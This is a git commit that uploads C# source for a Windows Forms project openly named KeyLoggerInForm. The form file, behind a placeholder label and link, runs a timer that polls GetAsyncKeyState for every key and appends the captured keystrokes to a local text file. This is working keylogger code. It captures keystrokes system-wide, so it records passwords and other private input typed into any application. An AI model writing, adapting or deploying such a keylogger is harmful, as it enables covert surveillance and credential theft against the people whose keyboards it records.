d1dfb660ffa6dbd7e7634c9039413874487ac10a
voblav <35613203+voblav@users.noreply.github.com>
2018-05-20 21:40:45 +0300

    Add files via upload

---
+++ KeyLoggerInForm_/KeyLoggerInForm/MainForm2.Designer.cs
@@ -0,0 +1,81 @@
+﻿namespace KeyLoggerInForm
+{
+    partial class MainForm2
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            this.TimerKL = new System.Windows.Forms.Timer(this.components);
+            this.LinkOnTxt = new System.Windows.Forms.LinkLabel();
+            this.LabelTxt = new System.Windows.Forms.Label();
+            this.SuspendLayout();
+            // 
+            // TimerKL
+            // 
+            this.TimerKL.Enabled = true;
+            this.TimerKL.Tick += new System.EventHandler(this.TimerKL_Tick);
+            // 
+            // LinkOnTxt
+            // 
+            this.LinkOnTxt.AutoSize = true;
+            this.LinkOnTxt.Location = new System.Drawing.Point(29, 104);
+            this.LinkOnTxt.Name = "LinkOnTxt";
+            this.LinkOnTxt.Size = new System.Drawing.Size(23, 13);
+            this.LinkOnTxt.TabIndex = 0;
+            this.LinkOnTxt.TabStop = true;
+            this.LinkOnTxt.Text = "link";
+            // 
+            // LabelTxt
+            // 
+            this.LabelTxt.AutoSize = true;
+            this.LabelTxt.Location = new System.Drawing.Point(29, 80);
+            this.LabelTxt.Name = "LabelTxt";
+            this.LabelTxt.Size = new System.Drawing.Size(49, 13);
+            this.LabelTxt.TabIndex = 1;
+            this.LabelTxt.Text = "blablabla";
+            // 
+            // MainForm2
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(284, 261);
+            this.Controls.Add(this.LabelTxt);
+            this.Controls.Add(this.LinkOnTxt);
+            this.Name = "MainForm2";
+            this.Text = "MainForm";
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Timer TimerKL;
+        private System.Windows.Forms.LinkLabel LinkOnTxt;
+        private System.Windows.Forms.Label LabelTxt;
+    }
+}
---
+++ KeyLoggerInForm_/KeyLoggerInForm/MainForm2.cs
@@ -0,0 +1,54 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using System.IO;
+
+namespace KeyLoggerInForm
+{
+    public partial class MainForm2 : Form
+    {
+        
+        
+
+        [DllImport("User32.dll")]
+        private static extern short GetAsyncKeyState(int vkey);
+
+        public MainForm2()
+        {
+            InitializeComponent();
+            TimerKL.Start();
+        }
+        string text = "";
+
+        private void TimerKL_Tick(object sender, EventArgs e)
+        {
+            string buffer = "";
+            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
+            {
+                if (GetAsyncKeyState(i) == -32767)
+                {
+                    buffer += Enum.GetName(typeof(Keys), i);
+                }
+            }
+            text += buffer;
+            if(text.Length > 10)
+            {
+                WriteTotext(text);
+                text = "";
+            }
+        }
+        private void WriteTotext(string value)
+        {
+            StreamWriter stream = new StreamWriter("KeyLogStreamVoblav.txt", true);
+            stream.Write(value);
+            stream.Close();
+        }
+    }
+}
